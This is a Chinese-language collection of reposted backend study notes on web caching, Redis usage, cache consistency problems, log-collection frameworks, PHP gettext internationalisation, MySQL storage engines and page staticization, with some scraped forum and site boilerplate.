Redis 在日常工作中使用的居多。

Redis 学习网址：http://www.redis.cn/

MongoDB缓存
MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。

旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。

MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。

MongoDB 学习网址：http://www.mongodb.org.cn

WEB服务器缓存
Apache缓存
利用 mod_expires ，指定缓存的过期时间，可以缓存HTML、图片、JS、CSS 等。

打开 http.conf，开启模块：

LoadModule expires_module modules/mod_expires.so
指定缓存的过期时间：

<IfModule expires_module>
     #打开缓存
     ExpiresActive on 

     #css缓存(8640000秒=10天)
     ExpiresByType text/css A8640000

     #js缓存
     ExpiresByType application/x-javascript A8640000
     ExpiresByType application/javascript A8640000

     #html缓存
     ExpiresByType text/html A8640000

     #图片缓存
     ExpiresByType image/jpeg A8640000
     ExpiresByType image/gif A8640000
     ExpiresByType image/png A8640000
     ExpiresByType image/x-icon A8640000

 </IfModule>
Nginx缓存
利用 expire 参数，指定缓存的过期时间，可以缓存HTML、图片、JS、CSS 等。

打开 nginx.conf ：

//以图片为例：
location ~\.(gif|jpg|jepg|png|bmp|ico)$ { #加入新的location
    root html;
    expires 1d; #指定缓存时间
}
大家也可以了解下：proxy_cache_path 和 proxy_cache，进行缓存的设置。

Opcode缓存
Opcode（Operate Code）操作码。

PHP程序运行完后，马上释放所有内存，所有程序中的变量都销毁，每次请求都要重新翻译、执行，导致速度可能会偏慢。

当解释器完成对脚本代码的分析后，便将它们生成可以直接运行的中间代码，也称为操作码。

操作码 的目地是避免重复编译，减少CPU和内存开销。

APC缓存
APC（Alternative PHP Cache）可选 PHP 缓存。

APC 的目标是提供一个自由、 开放，和健全的框架，用于缓存、优化 PHP 中间代码。

APC 可以去掉 php 动态解析以及编译的时间，使php脚本可以执行的更快。

APC 扩展最后的发布时间为 2012-09-03。

感兴趣可以了解下，官方介绍：http://php.net/manual/zh/book...

eAccelerator
eAccelerator：A PHP opcode cache。

感兴趣可以了解下，官方介绍：http://eaccelerator.net/

XCache
XCache 是一个又快又稳定的 PHP opcode 缓存器。

感兴趣可以了解下，官方介绍：http://xcache.lighttpd.net/

小结
文章主要简单的介绍了 浏览器缓存、文件缓存、NoSQL缓存、WEB服务器缓存、Opcode缓存。

每一种缓存都可以深入研究，从介绍 -> 安装 -> 使用 -> 总结应用场景。

大家可以思考下，通过上面的介绍，工作中我们使用了哪些缓存？

还可以再使用哪些缓存，可以对我们的项目有帮助？

关于缓存的常见问题
用过缓存，大家肯定遇到过比较头痛的问题，比如数据一致性，雪崩，热点数据缓存，缓存监控等等。

给大家列出几个问题，纯属抛转引玉。

当项目中使用到缓存，我们是选择 Redis 还是 Memcached ，为什么？
举一些场景：

一、比如实现一个简单的日志收集功能或发送大量短信、邮件的功能，实现方式是先将数据收集到队列中，然后有一个定时任务去消耗队列，处理该做的事情。

直接使用 Redis 的 lpush，rpop 或 rpush，lpop。

//进队列
$redis->lpush(key, value);

//出队列
$redis->rpop(key);
Memcached 没有这种数据结构。

二、比如我们要存储用户信息，ID、姓名、电话、年龄、身高 ，怎么存储？

方案一：key => value

key = user_data_用户ID

value = json_encode(用户数据)

查询时，先取出key，然后进行json_decode解析。

方案二：hash

key = user_data_用户ID

hashKey = 姓名，value = xx

hashKey = 电话，value = xx

hashKey = 年龄，value = xx

hashKey = 身高，value = xx

查询时，取出key即可。

//新增
$redis->hSet(key, hashKey, value);
$redis->hSet(key, hashKey, value);
$redis->hSet(key, hashKey, value);

//编辑
$redis->hSet(key, hashKey, value);

//查询
$redis->hGetAll(key); //查询所有属性
$redis->hGet(key, hashKey); //查询某个属性
方案二 优于 方案一。

三、比如社交项目类似于新浪微博，个人中心的关注列表和粉丝列表，双向关注列表，还有热门微博，还有消息订阅 等等。

以上都用 Redis 提供的相关数据结构即可。

四、Memcached 只存储在内存中，而 Redis 既可以存储在内存中，也可以持久化到磁盘上。

如果需求中的数据需要持久化，请选择 Redis 。

个人在工作中没有用到 Memcached ，通过查询资料得到 Memcached 内存分配时优于 Redis。

Memcached 默认使用 Slab Allocation 机制管理内存，按照预先规定的大小，将分配的内存分割成特定长度的块以存储相应长度的key-value数据记录，以完全解决内存碎片问题。

如何保证，缓存与数据库的数据一致性？
新增数据：先新增到数据库，再新增到缓存。

编辑数据：先删除缓存数据，再修改数据库中数据，再新增到缓存。

删除数据：先删除缓存数据，再删除数据库中数据。

查询数据：先查询缓存数据，没有，再查询数据库，再新增到缓存。

强一致性是很难保证的，比如事务一致性，时间点一致性，最终一致性等。

具体问题具体分析吧。

缓存穿透怎么办？
用户请求缓存中不存在的数据，导致请求直接落在数据库上。

一、设置有规则的Key值，先验证Key是否符合规范。

二、接口限流、降级、熔断，请研究 istio：https://istio.io/

三、布隆过滤器。

四、为不存在的key值，设置空缓存和过期时间，如果存储层创建了数据，及时更新缓存。

雪崩怎么办？
一、互斥锁，只允许一个请求去重建索引，其他请求等待缓存重建执行完，重新从缓存获取数据。

二、双缓存策略，原始缓存和拷贝缓存，当原始缓存失效请求拷贝缓存，原始缓存失效时间设置为短期，拷贝缓存设置为长期。

已上，纯属抛转引玉，结合自己的情况，具体问题，具体分析吧。

推荐阅读
系统的讲解 - SSO 单点登录
系统的讲解 - PHP WEB 安全防御
系统的讲解 - PHP 接口签名验证
系统的讲解 - PHP 浮点数高精度运算
一起学习


 
阅读 4k 更新于 3月25日
本作品系 原创， 采用《署名-非商业性使用-禁止演绎 4.0 国际》许可协议

新亮
 2.4k
0 条评论
得票时间

撰写评论 ...
推荐阅读
Java高并发架构设计
在电商相关产品开发的这些年，我有幸的遇到了并发下的各种坑，这一路摸爬滚打过来有着不少的血泪史，这里进行的总结，作为自己的归档记录，同时分享给大家。

Java将军007  阅读 5.2k  27 赞  1 评论

大型网站技术架构-入门梳理
大型网站技术架构-入门梳理 标签 ： 架构设计 [TOC] 罗列了大型网站架构涉及到的概念，附上了简单说明 前言 本文是对《大型网站架构设计》(李智慧 著)一书的梳理，类似文字版的“思维导图” 全文主要围绕“性能，可...

brianway  阅读 3.5k  24 赞

大型分布式网站架构实战项目分析
distributed system is one in which components located at networked computers communicate and coordinate their actions only by passing messages（分布式系统是指位于网络计算机的组件仅通过传递消息来通...

bali  阅读 1.7k  19 赞  2 评论

深度解析大型分布式电商网站演变过程以及构架部署解决方案
本文是学习大型分布式网站架构的技术总结。对架构一个高性能，高可用，可伸缩，可扩展的分布式网站进行了概要性描述，并给出一个架构参考。一部分为读书笔记，一部分是个人经验总结。对大型分布式网站架构有很好...

bali  阅读 2.3k  16 赞

浅谈秒杀系统架构设计
秒杀是电子商务网站常见的一种营销手段。 原则 不要整个系统宕机。 即使系统故障，也不要将错误数据展示出来。 尽量保持公平公正。 实现效果 秒杀开始前，抢购按钮为活动未开始。 秒杀开始时，抢购按钮可以点击下...

新亮  阅读 4.8k  8 赞  2 评论

支撑千万级，大型电商分布式架构解析
大型分布式网站架构概述 1.1. 大型网站的特点用户多，分布广泛 大流量，高并发 海量数据，服务高可用 安全环境恶劣，易受网络攻击 功能多，变更快，频繁发布 从小到大，渐进发展 以用户为中心 免费服务，付费体验...

李红  阅读 637  6 赞

Java 应用一般架构
现在我们常见的不同系统不同语言之间的交互使用WebService，Http请求。WebService，即“Web 服务”，简写为 WS。从字面上理解，它其实就是“基于 Web 的服务”。而服务却是双方的，有服务需求方，就有服务提供方。服...

CODING  阅读 2.3k  3 赞  1 评论

Java 高并发环境下的性能优化，揭秘支付宝技术内幕
在电商相关产品开发的这些年，我有幸的遇到了并发下的各种坑，这一路摸爬滚打过来有着不少的血泪史，这里进行的总结，作为自己的归档记录，同时分享给大家。

Java高端架构师  阅读 276  2 赞

新亮笔记
用户专栏
技术的深度和广度只能靠自己努力去发掘，谁也不能替你学习，在这里希望你能有所收获。

934 人关注
74 篇文章

Planets
广告位促销，月曝光三千万，10 元/天
大厂进阶之路
BAT资深研发工程师带你丰富PHP技能树
Python3.x核心技术与实战
BAT 专家亲手教你真正的编程
前端晋升必备技能
iview核心开发者亲自教你Vue实战
2020 年新版 Springboot 2.3 教程
Spring5 / Mybatis / Vue / Cubeui
▶ 目录
后端知识库
产品
热门问答
热门专栏
热门课程
最新活动
技术圈
酷工作
移动客户端
课程
Java 开发课程
PHP 开发课程
Python 开发课程
前端开发课程
移动开发课程
资源
每周精选
用户排行榜
徽章
帮助中心
声望与权限
社区服务中心
合作
关于我们
广告投放
职位发布
讲师招募
联系我们
合作伙伴
关注
产品技术日志
社区运营日志
市场运营日志
团队日志
社区访谈
条款
服务条款
隐私政策
下载 App
Copyright © 2011-2020 SegmentFault.

浙ICP备 15005796号-2 浙公网安备 33010602002000号 杭州堆栈科技有限公司版权所有

   
请登录后复制

```

### 搜索解决方案
```

首页   注册   登录
V2EX = way to explore
V2EX 是一个关于分享和探索的地方
现在注册
已注册用户请  登录

 
F0urV2EX  ›  PHP
关于PHP搜索引擎和中文分词的解决方案的咨询
  1     F0ur · 2013-09-22 01:00:04 +08:00 · 5746 次点击
这是一个创建于 2518 天前的主题，其中的信息可能已经有所发展或是发生改变。
需要选择一个搜索引擎+中文分词的方案
查了一些资料，目前有3个方案
1.coreseek
基于sphinx+LibMMSeg
我唯一担心的是因为coreseek长期不更新,最新版用的还是sphinx 2.0.2 dev,会不会有什么问题

2.sphinx for chinese
基于sphinx+xdict
一样长期不更新，最新版用的sphinx 2.1.0 dev, 社区中关于分词系统也指出了一些不足

3.xunsearch
基于xapian+scws
更新稳定，但是无从下手，指南写的还是有些问题，当然，我还没去重点研究

因为我对这方面知识了解的不多，只能根据需求找到这3个解决方案，也无法着重做个对比或者选择
所以请懂行的大大们指点一下我，或者有更好的选择方案
先感谢下所有回复的诸位了
 sphinx 分词 最新版9 条回复  •  2014-09-10 09:56:38 +08:00
liuxurong		    1
liuxurong   2013-09-22 01:32:18 +08:00 via iPad
用 v2ex 方案就可以了
ted05		    2
ted05   2013-09-22 06:42:44 +08:00
信息检索这个挺难的，最近在学用java是怎么实现的。。。
angelface		    3
angelface   2013-09-22 06:48:58 +08:00 via iPhone
还是看你的需求，如果你只是做个站内搜索，google就挺好，如果你要对搜索结果进行控制，那就上面的三种随便选一个，然后深入研究
f489753		    4
f489753   2013-09-22 08:09:10 +08:00
目前在用sphinx，不过感觉xunsearch有前途。
当然也可以搞java方案嘛，lucene、slor之类也可以接上。
felix021		    5
felix021   2013-09-22 09:49:59 +08:00
小站的话xunsearch就很够用了，文档写得很全啊，有啥问题？

不过xunsearch的速度是硬伤，太慢了，千万级的数据量可能hold不住的感觉。
F0ur		    6
F0ur   2013-09-22 10:41:36 +08:00
@liuxurong v2ex方案是什么
@angelface google搜索还是不能满足需求，可能带有facet功能
@f489753 lucene、slor的话也可以考虑~我再去研究研究
@felix021 我也是觉得小站xunsearch够了，但是是商业站后期数据量肯定会上去的，所以想找个完全的解决方案
hfcorriez		    7
hfcorriez   2013-09-22 10:47:53 +08:00   ❤️ 1
可以试试ElasticSearch
Yuansir		    8
Yuansir   2013-09-22 13:02:45 +08:00   ❤️ 1
xunsearch 和 sphinx+coreseek 都用过，推荐xunsearch吧，文档齐全，性能不错，功能也强大，坑比较少，比较容易配置和使用
flyingxu		    9
flyingxu   2014-09-10 09:56:38 +08:00
@felix021 速度有多伤？能实现类似stackoverflow提问题时及时搜索类似问题吗？

 
关于   ·   FAQ   ·   API   ·   我们的愿景   ·   广告投放   ·   感谢   ·   实用小工具   ·   2542 人在线   最高记录 5168   ·      Select Language
创意工作者们的社区
World is powered by solitude
VERSION: 3.9.8.5 · 23ms · UTC 13:38 · PVG 21:38 · LAX 06:38 · JFK 09:38
♥ Do have faith in what you're doing.

```

### 各维度监控方案
```
https://www.zhihu.com/question/37585246

```

### 日志收集集中处理方案
```
https://www.jianshu.com/p/e3ccb75bd813
随着业务的快速发展，各种服务和组件也要随着增加或扩容，服务器的台数随之增加，这样给日志运维带来很大的问题。如果你要查阅某个项目的日志，服务器数十上百台的话，这将是一件非常繁琐和低效的事。另外，如果你想对这些日志进行实时的分析统计，也无从下手。因此，我们需要一种数据收集框架，它可以将不同服务器上的日志数据，高效地收集汇总在一起，供在线或者离线查阅和分析，并且还可以对系统实施监控和故障告警。

本文档通过介绍Flume NG、Scribe、Kafka、Chukwa和ELK的特点，结构模型，使用时的优势和劣势，以及我们自定义的指标项对比，最后得出它们各自的应用场景，为框架选型提供技术参考。

数据收集系统
Flume NG
Flume NG的介绍
Flume NG 是Cloudera提供的分布式数据收集系统，它能够将不同数据源的海量日志数据进行高效的收集、聚合、移动，最后存储到存储中心。Flume NG支持（故障转移）failover和负载均衡。

Flume NG的结构
Flume NG传输数据的基本单元是event，如果是文件，通常是一行记录。运行的核心是Agent，包含三个核心组件，分别是Source、Channel和Sink，其结构模型图如下：

Flume NG的介绍
Source：接收外部源发送过来的数据，支持Avro、Thrift、JMS、Syslog、Kafka和Http post（自己代码实现）等多种方式的日志接收。提供ExecSource以tail -f等命令的方式实现实时日志收集；提供SpoolSource以读取新增的文件的方式实现低延时的日志收集。
Channel：是一个存储池，接收Source的输出。有MemoryChannel、JDBC Channel、MemoryRecoverChannel和FileChannel等主要类型。其中MemoryChannel可以实现高速吞吐，但无法保证数据的完整性。FileChannel能实现数据的完整性和一致性。Channel中的数据仅会在数据保存在下一个Channel或最终的存储中心时，才会被删除。
Sink：消费Channel中的数据，然后发送给数据存储系统（HDFS、Elasticsearch或者HBase等)。一个Agent可以存在多个Sink，Sink支持负载均衡和failover。
Flume NG的结构图：
多个Agent顺序连接：

最简单的部署方式，通过多个Agent连接，将原始数据传送到下一个Agent或者是最终的存储中心，适合初学者。

多个Agent顺序连接
多个Agent的数据汇聚在同一个Agent中：
多个Agent的数据汇聚在同一个Agent中
最常见的部署方式，比如在各个应用服务器上部署Flume NG，将原始数据同步到一台agent上。

多路Agent连接：
多路Agent连接
包括分流和复制两种方式，分流是根据header信息进行数据的分类存储数据，复制是将数据复制多份。

负载均衡数据模型：
负载均衡数据模型
Agent1负责路由，每个Sink连接一个Agent，Sink支持负载均衡和Failover。

Flume NG的优势劣势
优势：Flume NG通过事务保证数据的完整性和一致性；支持负载均衡；很容易进行水平扩展；社区活跃度高；文档资料比较丰富；依赖第三方库少；部署简单；支持多种存储系统。
劣势：Flume NG需要自己实现客户端代码；ExecSource方式会存在数据丢失的可能，SpoolSource方式做不到监控文件的新增记录；对数据的过滤能力较差。
Scribe
Scribe介绍
Scribe是Facebook开源的一个基于thrift框架的日志收集系统，在facebook内部已经得到大量的应用。Scribe可以从不同数据源，不同机器上收集日志，然后将它们存入存储中心，目前Facebook已停止对Scribe的更新和维护。

Scribe结构
Scribe结构图：
Scribe结构图
Scribe 客户端：需要自己基于Thrift框架实现，每条消息包含一个category和一个message信息，Scribe Server根据category将数据存储在不同的存储系统。
Scribe Server：根据配置，将各个category类型的日志发到不同的存储系统。Scribe Server收集到数据后，将数据放到共享队列，然后Push到存储中心，当存储中心出现故障时，Scribe 会将数据保存在本地文件中，待存储中心恢复后再Push数据。
存储中心：包括HDFS、File和Scribe。
Scribe优势和劣势
优势：具有很高的容错性；支持水平扩展；
劣势：依赖zookeeper或Hash等其他工具；需要自己实现客户端代码；社区活跃度低；文档资料极少；依赖第三方库多；部署较为复杂；存储系统类型较少；数据过滤解析能力差；Facebook公司已停止更新和技术支持。
Kafka
Kafka的介绍
Kafka 是一个基于分布式的消息系统，开发自 LinkedIn ['lɪŋktɪn]，作为 LinkedIn 的活动流和运营数据处理管道。活动流数据包括页面访问量、被查看内容方面的信息以及搜索情况等。运营数据指服务器的性能数据，包括CPU、IO使用率、请求时间、服务日志等。

Kafka结构模型：
Kafka结构模型
Producer：消息发送者，负责发送消息给Broker。
Kafka Cluster：由多个Kafka实例组成，每个实例（Server）成为Broker。集群的搭建依赖Zookeeper。
Consumer：消息消费者，从Kafka读取消息。
Topic：一类消息，类似Queue的概念，Topic在物理上是分节点存储。
Consumer Group：实现一个Topic消息单播和广播的一个手段。要实现广播，只要每个consumer有一个独立的Group就可以。要实现单播，只要所有的Consumer在同一个Group里即可。
Kafka的优势和劣势
Kafka 通过系统解耦、Partition（分片存储）、复制备份、持久化、缓存、集群和异步通信等策略提供了一个高性能、高可靠、可扩展的数据管道和消息系统。

优势：高性能；高可靠；通过Kafka Conenector对接HDFS、Elasticsearch、JDBC等其它系统；支持水平扩展；社区活跃度高；文档资料丰富；依赖第三方库较少。
劣势：依赖Zookeeper；需要自己实现客户端代码；数据过滤解析能力差。
Chukwa
Chukwa的介绍
chukwa 是一个用于监控大型分布式系统的数据收集系统，构建在 Hadoop 的 HDFS 和 map/reduce 框架之上的，继承了 hadoop 的扩展性和健壮性，还包含HICC，可用于展示、监控和分析已收集的数据。

Chukwa的结构
image.png
Agent：负责采集数据，并发送给Collector。agent采用“watchdog”的机制，自动重启终止的数据采集进程，防止数据丢失。
Adaptor：直接采集数据的接口和工具，支持命令行，log文件和httpSender输出,可以按自己的需求实现Adaptor，一个Agent可以管理多个Adaptor的数据采集。
Collectors：负责收集Agents发送过来的数据，并定时写入集群。
Map/Reduce jobs：定时启动，在此阶段，Chukwa提供了demux [dɪm'ju:ks]和archive [ˈɑ:kaɪv]两种内置的作业类型，其中，demux作为负责对数据分类、排序、去重，archive作业负责把同类型的数据合并。
HICC：负责数据的展示。
Chukwa的优势和劣势
优势：高可靠，易扩展；社区活跃度较高；文档资料较丰富；
劣势：依赖hadoop。
ELK
ELK的介绍
ELK 不是一款软件，而是Elasticsearch、Logstash和Kibana首字母的缩写。这三者是开源软件，通常配合一起使用，而且先后归于Elasic.co公司的名下，所以简称ELK Stack。根据Google Trend的信息显示，ELK已经成为目前最流行的的集中式日志解决方案。

Elasticsearch：是一个分布式搜索和分析引擎，具有高可伸缩、高可靠和易管理等特点。基于Apache Lucene构建，能对大容量的数据进行接近实时的存储、搜索和分析操作。通过简单的配置，Elasticsearch就会帮你管理集群、分片、故障转移、主节点选举等，还提供集群状态的监控接口。

Logstash：数据收集引擎。它支持从各种数据源收集数据，并对数据进行过滤、分析、丰富、统一格式等操作，然后存储到用户指定的位置。Logstash支持file、syslog、tcp、stdin、redis和kafka等多种接收方式。支持elasticrsearch、email、exec、nagios、tcp、hdfs等多种方式输出。

Kibana：数据分析和可视化平台。通常与Elasticsearch配合使用，对其中的数据进行搜索、分析并能以图表的方式显示。

Filebeat：ELK协议栈的新成员，一个轻量级开源日志文件数据搜集器。我们在需要采集日志数据的服务器上安装Filebeat，并指定日志目录或日志文件后，Filebeat就能读取数据，迅速发送到Logstash进行解析，亦或直接发送到Elasticsearch进行集中式存储和分析。FileBeat可以监听指定目录下是否新增文件，监听文件是否新增记录，文件在一定时间内没更新取消监听，支持批量数据传送，支持负载均衡的方式传送数据到Logstash或Elasticsearch。支持SSL/TLS协议传送。

ELK的结构
最简单的结构模型：
最简单的结构模型
这种结构很简单，适合初学者。初学者可以搭建此结构，了解ELK如何工作。

Logstash作为日志收集器：
Logstash作为日志收集器
这种结构模型需要在各个应用服务器上部署Logstash，但Logstash比较消耗CPU和内存资源，所以比较适合资源丰富的服务器，否则可能会导致应用服务器无法工作。

Beats作为日志收集器，Beats包括四种：
Packetbeat(搜集网络流量数据)
Topbeat(搜集系统、进程、文件系统级别的CPU和内存使用情况等数据)
Filebeat(收集文件数据)
Winlogbeat(收集Window时间日志数据)
Beats作为日志收集器
这种结构解决了Logstash在各服务器节点上占用资源高的问题。另外，数据格式规范的情况下，可以移出Logstash节点,Beats直接发送数据到Elasticsearch，解决Logstash占用资源高的问题。

引入消息队列机制
引入消息队列机制
这种结构适合日志规模比较大的情况。引入消息队列，将上下游服务解耦，减轻下游服务的压力，解决在巨量日志下，网络阻塞延迟、数据丢失的问题，使得网络传输更稳定、更高效，避免级联效应。在巨量日志的情况下，Logstash节点和Elasticsearch节点负荷比较重，可将它们配置成集群模式，分担负荷。在日志比较规范的情况下，可以去掉Logstash,Beats直接发送数据到Elasticsearch，解决Logstash占用资源高的问题。

ELK的优势和劣势
优势：提供一套完整的日志收集、分析、存储和数据展示的解决方案；Logstash支持集群部署和水平扩展；Elasticsearch高可用，支持集群部署和水平扩展；社区活跃度高；文档资料较丰富；部署简单。
劣势：Logstash占用资源比较高。
指标项对比
指标项对比
结论
结论
ELK告警策略
ELK告警策略
参考资料
Flume NG
http://blog.csdn.net/zhaodedong/article/details/52541688
http://www.gegugu.com/2016/04/11/5484.html

Scribe
http://www.itdadao.com/articles/c15a502872p0.html
http://www.36dsj.com/archives/66047

Kafka
http://www.cnblogs.com/likehua/p/3999538.html
http://www.infoq.com/cn/articles/kafka-analysis-part-1

Chukwa
http://www.it165.net/admin/html/201403/2507.html
http://f.dataguru.cn/thread-97612-1-1.html

ELK Stack 中文指南
http://kibana.logstash.es/content/

Logstash最佳实践
http://udn.yyuap.com/doc/logstash-best-practice-cn/index.html

Elasticsearch 权威指南
https://es.xiaoleilu.com/

Elasticsearche配置：
https://my.oschina.net/topeagle/blog/405149
https://my.oschina.net/Yumikio/blog/805877

Filebeat配置：
http://m.blog.csdn.net/article/details?id=53584173
http://michaelkang.blog.51cto.com/1553154/1864225

Search Guard:
https://github.com/floragunncom/search-guard-docs
http://www.cnblogs.com/Orgliny/p/6168986.html
http://kibana.logstash.es/content/elasticsearch/auth/searchguard-2.html

```

### 国际化
```
php程序的国际化实现方法（利用gettext）
 更新时间：2011年08月14日 13:11:59   转载 作者：  
这里我们主要介绍window平台下使用php的扩展gettext实现程序的国际化。

 
步骤一：搭建环境
1，首先查看你的php扩展目录下是否有php_gettext.dll这个文件，如果没有，这就需要你
下载一个或是从其他地方拷贝一个，然后放到php扩展目录。
2，打开php.ini，查找”;extension=php_gettext.dll“ ，然后去除注释，重启apache。
步骤二:原理讲解
假如你的没有国际化的程序里有这样的代码，echo "你好";,而国际化的程序你要写成
echo gettext("你好");，然后再在配置文件里添加“你好”相对应的英文“Hi”。
这时，中国地区浏览都会在屏幕上输出“你好”，而美国地区浏览都会在屏幕上输出
“Hi”。也就是说，最终显示什么是根据你的配置文件而定的，如果找不到配置文件，
才会输出程序里面的内容。
步骤三：编码测试
1，我们在d:\www下面新建文件hi.php，详细代码如下
复制代码代码如下:

<?php
$domain = 'test';
bindtextdomain($domain, "locale/");//设置某个域的mo文件路径
textdomain($domain);//设置gettext()函数从哪个域去找mo文件
echo gettext("Hi!");//_()是gettext()函数的简写形式
?>


这时你运行改程序，只会输出“Hi”。但我们是中国人，我们不认识“Hi”，
我们只认识“你好”，这时就要配置文件出马。配置文件的生成一般借助一款工具。
下载地址：http://nchc.dl.sourceforge.net/sourceforge/gnuwin32/gettext-0.14.4.exe
安装好以后，为了在任意目录里使用，需要把“安装路径/bin”添加到系统环境变量里。
步骤四：配置文件的生成
1，我们假设你的工具已经安装好，并且可以在任意目录使用。现在就要运行cmd，并把
路径切换到d:\www下面，也就是hi.php所在目录。
键入xgettext -d hi hi.php --from-code=gb2312，然后执行，这时你可以看到新生成一个
hi.po文件，注意：--from-code=gb2312，其中gb2312还可以是utf-8。
2，打开hi.po文件，显示如下：
复制代码代码如下:

# SOME DESCRIPTIVE TITLE.
# Copyright (C) YEAR THE PACKAGE'S COPYRIGHT HOLDER
# This file is distributed under the same license as the PACKAGE package.
# FIRST AUTHOR <EMAIL@ADDRESS>, YEAR.
#
#, fuzzy
msgid ""
msgstr ""
"Project-Id-Version: PACKAGE VERSION\n"
"Report-Msgid-Bugs-To: \n"
"POT-Creation-Date: 2009-01-19 17:47+0800\n"
"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
"Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
"Language-Team: LANGUAGE <LL@li.org>\n"
"MIME-Version: 1.0\n"
"Content-Type: text/plain; charset=CHARSET\n"
"Content-Transfer-Encoding: 8bit\n"
#: hi.php:6
msgid "Hi!"
msgstr ""

现在有两个地方需要修改，
1："Content-Type: text/plain; charset=CHARSET\n"
2：msgstr ""
把1中的CHARSET修改成gb2312，然后把2修改成msgstr "你好"。
3，键入msgfmt -o hi.mo hi.po，执行，这时生成hi.mo文件。
然后在d:\www下新建locale\zh_Cn\LC_MESSAGES目录，把hi.mo拷到这里就行了。
4，现在重启apache，再次运行，屏幕上可以输出“你好”。
其他：
如果使用utft-8编码的话，需要使用
bind_textdomain_codeset($domain,'UTF-8');
相应的要把hi.po里的CHARSET改成utf-8，还需要把hi.po保存成utf-8格式，
再次生成hi.mo就行了。
总结：
我们都希望我们写的程序可以被大众甚至国际普遍使用，像大名鼎鼎的wordpress的
国际化使用的也是他。gettext还是非常不错的，简单易用，
https://www.jb51.net/article/28000.htm
```

### 数据库设计
```
https://www.cnblogs.com/xuemj/articles/6999574.html
什么是表引擎

我们看到的表结构，它的本质是数据在硬盘中的存储。根据不同的特性，数据的存储方式不同。比如：对于每一条数据，在硬盘中它是怎么存储的，怎么压缩的，怎么建立索引和优化的，它的读取和写入是怎么实现的。这些完整的一条路径，我们称之为表引擎。

选择的依据

选择的依据，是我们的需求，我们的需求很大程度上决定我们的选择。有的时候，我们的习惯决策着这个过程。这里，我们关注一下方面：

并发性，同一时间支持的写入和读取特性；

安全性，物理存储结构，异常发生时数据的是否可靠；

事务性，数据执行的颗粒，以及提供的定义原子操作的特性；

查询优化，这里我们指查询缓存和索引；

在开发上，我们主要关注：（1,3,4），在运维层面，我们关注（2）。

在表的选择上，最常用的是如下：

MyIsam

Innodb

Memory（Heap）

从案例开始

现在我们要做一个留言板，我们发现这个留言板可能有几种情况：

有很多人同时留言，同时，查看留言的人也很多；

留言的人很少，每天查看留言的人非常多；

我们的功能有留言奖励，每天前10个留言的，会有积分奖励；

我们的留言板有点像实时聊天器，对性能要求和实时性要求非常高；

MYSIAM

在5.0的时代，这个表是使用得非常普遍的，我了解的Discuz就是使用这种表。它的优势：查询速度，被很多人看重。我们看看它的一些特点：

理论上存储无限制（与操作系统的文件系统有关）

存在text/blob全文索引

索引缓存

数据压缩

低存储空间和低内存占用

高速写入

查询缓存

串行写入时，全表锁（读和写）

不支持事务

集群支持

B-Tree索引

create table a_myisam (.....) ENGINE = MYISAM;

以上特性，我们看到MyIsam主要是为查询而设计的，也是最初大家做数据存储时考虑的东西。

InnoDB 从5.1开始，InnoDB慢慢发展起来，并且成为重要数据的存储引擎。它的特点如下：

有限制的存储

索引缓存

支持事务

查询缓存

写入行锁

B-Tree索引

create table a_myisam (.....) ENGINE = InnoDB;

InnoDB更加稳定和成熟，也为更多需求提供解决方案。

Memory

查询速度快

MySQL重启后丢失

B-Tree和HASH索引

仅仅是为了快，小量数据。

A：很多人同时留言，看留言的人也很多

这意味着什么？我们的写入速度要够快且写入不影响读取。或者，我们可以并行写入。这种情况，如果我们选择MyIsam，写入量的增加会导致全表上锁，以至于读取时，要等待锁的释放；那么，显然，MyIsam会造成表性能瓶颈。这种情况，我们选择Innodb。理由如下：

Innodb写入时，锁为行锁；不影响其它写入，影响少量读（有可能大量）；

Innodb的查询性能理论上比Myisam稍差，但是非常小，可忽略；

B：留言的人很少，每天查看留言的人非常多

这个时候，选择MyIsam，没有什么问题。（读/写比较高）

C：我们的功能有留言奖励，每天前10个留言的，会有积分奖励

我们需要一些原子级别的操作，也就是在判断某条留言是前10名的时候，就将它标记，而这个标记需要原子级的：标记的过程中不允许别人查询和写入（全表锁）。这是什么意思？由于我们的操作是没有严格的前后顺序的，计算机的CPU运算分片本质是串行的。假设这个时候你有两条命令：

查询是否前10个

增加积分

假设现在已经有9个条留言了，那么这个时候来了两个请求，都查询自己是否是前10个。第一个用户查到自己是第10个，然后在它要执行第二步的时候，第11个用户来了，他也查询自己是第10个，如果没有保护机制，那么第11个也被认为是满足条件，他也会被加分。

如何实现？

一般情况下我们会增加一个字段来做标记，这个字段假设为：lock，那么更新的时候保证这个中间是没有其它操作的。我们称之为事务。

start

select ... from table where lock = 0 for update;

update table set lock = 1;

commit

D：我们的留言板有点像实时聊天器，对性能要求和实时性要求非常高

呵呵，这个不用说了，使用innodb和memory都可以。一般我们使用内存存储，会把它当做K-V来使用，根据设计的情况来选择。（不过，业内很少时候，内存的存储一般都会选择Memcache和Redis）。

总结一下

如果读/写 比很大的话，假设这个尺度为10，那么，就使用myisam（写入并发小的情况）

如果需要事务的支持，使用innodb

如果需要对并发性（写入）有要求的话，使用innodb

其它情况，可以根据实际场景选择

```

### [静态化如何实现的](https://blog.csdn.net/qq_39618306/article/details/79014438)
```
这里要说的静态化指的是页面静态化，也即生成实实在在的静态文件，
也即不需要查询数据库就可以直接从文件中获取数据，
指的是真静态。它的实现方式主要有两种：
一种是我们在添加信息入库的时候就生成的静态文件，也称为模板替换技术，
这种主要用在后台，用于一些基本上很少变化的信息上，
在添加信息的时候使用添加的信息来替换制定好的模板中的内容，
达到生成静态文件的目的，这样在前台访问该信息时，
可以直接从生成好的静态文件中获取信息，如一些CMS系统。
另外一种是用户在访问我们的页面时先判断是否有对应的缓存文件存在，
如果存在就读缓存，不存在就读数据库，同时生成缓存文件。
这种实现的主要原理是基于PHP中的ob缓冲技术来实现的，
当没有静态文件时，从数据库中读取，读取的数据使用OB缓存，
使用相关的函数从OB缓冲中读取数据，写入到文件中，形成静态文件。
当然这个过程中要考虑静态文件的缓存周期问题，
我们可以根据文件的最后修改时间和当前时间及设定的缓存时间来定时更新缓存文件。
```

### 画出常见 PHP 应用架构图
```
https://www.sohu.com/a/321617933_100240362
PHP作为网络开发的强大语言之一,现在应用非常广泛，具有开放源代码，跨平台性强，开发快捷，效率高，面向对象，并且易于上手，专业专注等诸多优点。

